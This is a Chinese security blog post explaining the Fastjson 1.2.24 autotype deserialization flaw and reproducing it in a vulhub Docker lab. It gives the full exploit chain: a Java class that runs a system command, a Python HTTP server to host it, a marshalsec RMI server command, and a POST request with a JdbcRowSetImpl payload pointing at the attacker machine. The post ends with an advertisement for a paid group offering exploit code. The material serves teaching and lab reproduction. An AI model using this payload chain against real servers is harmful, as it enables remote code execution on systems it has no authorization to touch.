#  Java反序列化漏洞 | Fastjson反序列化漏洞原理+漏洞复现   
原创 神农Sec  神农Sec   2025-01-31 01:03  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言**  
  
  
Fastjson反序列化漏洞也是一个知名度比较高的Java反序列化漏洞，他是阿里巴巴的开源库，下面我将主要带大家了解Fastjson反序列化漏洞的原理以及相关知识点的内容，然后带师傅们去利用rmi服务去复现这个Fastjson反序列化漏洞！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4nNpZc8VBtdRUadXxhyXZgaAhuPGookUSDBFdqBOqTOictqIdru7NpPw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞原理及介绍**  
  
### 1、什么是json？  
  
json是一种数据格式，对于我们互联网来说，我们服务器和客户端有大量的数据需要进行传输。以前通用的方式是xml，但是xml数据体重太大，效率低下，所以就有了另外一种数据格式，叫json。  
  
**json一共有两种体现：**  
- json对象、json数组  
  
- json对象：json本身是一个字符串，{建：值, 建：值}  
  
举例：  
```
{
  "name" : "routing",
  "2003-11-11",
  "age" : 20,
  "likes" : ["看电影" , "看书"]
}
```  
  
### 2、Fastjson概述  
  
FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。  
  
Fastjson 是一个 Java 库，提供了Java 对象与 JSON 相互转换。  
- **toJSONString()方法**  
：（序列化）将json对象转换成JSON字符串；  
  
- **parseObject()方法**  
：（反序列化）将JSON字符串转换成json对象。  
  
使用方式：  
```
//序列化
String text = JSON.toJSONString(obj); 
//反序列化
VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型
VO vo = JSON.parseObject("{...}"); //JSON文本解析成JSONObject类型
VO vo = JSON.parseObject("{...}", VO.class); //JSON文本解析成VO.class类
```  
  
3、Fastjson漏洞原理  
  
fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。  
  
由于要获取json数据详细类型，每次都需要读取**@type**，而@type可以指定反序列化任意类调用其**set，get，is**  
方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。  
  
那么**攻击者只要准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE。**  
  
【JNDI提供了查找和访问各种命名和目录服务的通用、统一的接口。支持的服务：DNS，LDAP，RMI，CORBA等】  
  
关于JNDI注入，大家可以看我之前写的一篇关于log4j的JNDI注入漏洞的详细介绍：  
```
https://blog.csdn.net/SENMINGya/article/details/136819823?spm=1001.2014.3001.5502
```  
  
### 4、Fastjson漏洞利用详解  
  
1、攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。  
  
2、存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？  
  
3、rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）  
  
4、rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。  
  
5、靶机服务器执行了恶意代码，被攻击者成功利用。  
  
这里给大家看看红队大佬的图解，希望对大家理解fastjson漏洞原理的利用有帮助。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by42Wy2OSlsrTge9I1xhrK2RtHNlmthzgD0KeeMukVomszL0LDedhoeKg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 环境搭建**  
  
  
靶机：Ubantu IP 192.168.103.161 （先要安装docker，然后下载vulhub） 启动vulhub里面的fastjson环境  
  
攻击机：kali   IP 192.168.103.129  
  
我们先利用Ubantu进入vulnhub靶场，进入/vulhub/fastjson/1.2.24-rce目录下，然后执行以下命令，看到done，那么就表示环境开启成功了。  
```
docker-compose up -d
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4UiciaykJA1oj8PBXl6YpqRx3tHbw0sGUSqYFztn2BX8HrnxpF8yM4qRg/640?wx_fmt=png&from=appmsg "")  
  
  
查看我们ubantu中docker开启环境的端口情况，端口是8090  
```
docker ps -a
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by44YHmgcR0dibC4ibqOsz2kZlc1hgNyaaYRiciaRyx7qcF34xXjYYxN9mgiaQ/640?wx_fmt=png&from=appmsg "")  
  
我们访问 ubantu的IP+端口，192.168.103.161:8090，得到如下的界面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by459Wq5LFK112kJpcBgicSteicSqLUoXB0H7PXoArXxTFvtGlweCg9zK2g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 漏洞复现**  
  
### 1、远程创建文件  
  
一、这里要创建java代码文件，所以对环境比较严格，要保证java和javac的版本一致，且都是1.8的版本！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4gc4V12js8eLibcmNW58zBIzVP7Hu56NUN4rKSeOugGibZLcLkflCpSDA/640?wx_fmt=png&from=appmsg "")  
  
  
二、我们先在本地把java代码文件编译好，然后再上传到攻击机：kali下保存以下代码为TouchFile.java文件  
```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
 
public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/successFrank"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4SGxYXx9R8Eq3mvLibTZaq53BL32xRyugXqib5nSDOq5E7ywGhhNB7QaQ/640?wx_fmt=png&from=appmsg "")  
  
三、编译.java文件，生成.class文件。  
```
javac TouchFile.java
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4R0q3vPs8r6or0lIIXbIHH7zmyToVyiaC8YNkeWYUiaB0ZL68npDkGVWA/640?wx_fmt=png&from=appmsg "")  
  
四、然后我们再把编译好的.class文件上传到攻击机kali目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4UVicX3qnXpkiaE3zdUqIKZFBd3dvMMHtxAWNmibjKSq6Acibt09ic0FgYVQ/640?wx_fmt=png&from=appmsg "")  
  
五、在class文件所在的目录，Python起一个http服务。用4444端口启动http服务的命令为：  
```
┌──(root💀kali)-[~/桌面/fastjson]
└─# python -m http.server 4444
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4n0VdfIjhoOZkscEibe57DicuWr8fFtO4zoltSdkeoJSByCic4Xlow2ib7g/640?wx_fmt=png&from=appmsg "")  
  
六、访问kali的IP+开启http服务的4444端口，就会出现下面的页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4xNVvwpbaSUN1YWh5EiaGWtEvUCl2rGhabVr6XQWmgXyiavgibvORQPQVg/640?wx_fmt=png&from=appmsg "")  
### 2、开启RMI服务  
  
一、开启rmi服务之前，我们需要利用marshalsec项目，需要用到marshalsec-0.0.3-SNAPSHOT-all.jar工具，下载链接如下：  
https://github.com/bkfish/Apache-Log4j-Learning/tree/main/tools  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4aw2rrGZ8D2gozGLFur14pkaMUkmXE1EicRfH3jRRsNNnhib3fRy5pNoQ/640?wx_fmt=png&from=appmsg "")  
  
二、接下来使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类TouchFile.class：  
  
开启RMI服务，命令行中的IP地址是kali攻击机开始开启http服务的地址  
```
┌──(root💀kali)-[~/桌面/Apache-Log4j-Learning-main/tools]
└─# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.103.129:4444/#TouchFile" 9999
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4lpTCW1J2WeoIOTsndDDFNtyYrxdGVazB89xNsGbVsOyQ8OSI0xp8bA/640?wx_fmt=png&from=appmsg "")  
  
三、利用burp抓取靶机ubantu（192.168.103.161:8090）的包，然后再改变抓到的包的请求方式为POST，然后再发送到Repeater中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4JY884B9vLKHEViaibCpcb6V2EyoHicDId9dBicFgEiaWmSXkpalEkNC8mqw/640?wx_fmt=png&from=appmsg "")  
  
四、添加payload，师傅们可以参考我这个请求包的内容，因为我开始在网上找了很多，然后rmi服务监听都没有回应，都失败了。  
```
POST / HTTP/1.1
Host: 192.168.103.161:8090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 165
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.103.129:9999/TouchFile",
        "autoCommit":true
    }
}
```  
  
主要是看这两个地方，圈起来的是主要payload，然后看是否成功执行了，就看返回包中是否回显500关键字。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4PZhVJzOZ5kQjf9YpzSRmhWoXyyxCRx3fj2a8FplLOqtVqHO3bKLgibg/640?wx_fmt=png&from=appmsg "")  
  
然后可以看到rmi服务的监听和开启的http服务都有回应了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4TQRib2RUic0ThTE9via6Qr2Y7x9Jqo4LGMQeubTnnfYoEzfKKxIcnib0gw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4YUaQ29yfRzbBrZk5icZ0Sia1d2SFYsPpBOW5xbofpEwShUJRmvAnaNDQ/640?wx_fmt=png&from=appmsg "")  
  
五、我们开始的TouchFile.java这个脚本文件，我们是让他执行touch /tmp/successFrank 目录文件，我们来看看是否执行成功了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4MiaoU5kfJysPPwk8icjuz7LdAgW6GOr6BBkfr2YqBe0x2R4OD2m73ESA/640?wx_fmt=png&from=appmsg "")  
  
详细步骤如下：  
```
1、docker ps  //找到CONTAINER ID
2、docker exec -it CONTAINER ID /bin/bash   //就可以进入CONTAINER ID当前目录下了
3、cd /tmp  
4、ls   //就可以看到创建的successFrank文件了
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXfOkCE3VZyH4NtVsdY8by4XP91vvCjTB4Dib30cpQ2fjeJyYNiaV0tMfV24BqiagQGSlBra4krUtYwQ/640?wx_fmt=png&from=appmsg "")  
  
目前，我们就把漏洞复现成功了！！！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 总结**  
  
  
JDK1.8安装详细教程：  
https://blog.csdn.net/m0_54899775/article/details/122420533  
  
安装vulnhub详细教程：  
https://blog.csdn.net/m0_54899775/article/details/122463532  
  
哔哩哔哩视频讲解：【fastjson反序列化漏洞演示加详细讲解加原理】   
https://www.bilibili.com/video/BV1Ab4y1d7w1/?share_source=copy_web&vd_source=268f8d699ac32cf11e9bdc248399c5bd  
  
参考文章：  
  
https://github.com/bit4woo/code2sec.com  
  
https://xz.aliyun.com/t/14872  
  
burpsuit插件：  
  
https://github.com/pmiaowu/BurpFastJsonScan  
  
https://github.com/Maskhe/FastjsonScan?tab=readme-ov-file  
  
https://github.com/welk1n/JNDI-Injection-Exploit  
  
  
我们是神农安全，  
**点赞 + 在看**  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新  
**src/红蓝攻防**  
相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU9HiabHicghO61zG96hG318zIWdzPq1qMibtbLPlDocib1ndkeMCNOge8AdDB2dXj8bQ2WuIibcrUvEuQ/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满300人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
****  
